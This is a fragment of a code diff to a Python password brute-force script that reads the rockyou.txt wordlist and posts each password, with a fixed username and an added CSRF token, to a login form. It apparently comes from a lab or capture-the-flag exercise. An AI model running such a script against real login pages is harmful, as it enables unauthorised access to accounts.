@@ -13,7 +13,7 @@ username = 'username'
 with codecs.open('/usr/share/wordlists/rockyou.txt' ,'r+',encoding='utf-8',errors='ignore') as f:
     for line in f:
         passlist.append(line)
-print(passlist)
+#print(passlist)
 passlist = [ item.strip() for item in passlist]
 
 for password in passlist:
@@ -28,6 +28,7 @@ for password in passlist:
         'Referer': login_url
         }
     data ={
+            'tokenCSRF': token,
             'username' : username,
             'password' : password,
             'save' : ''
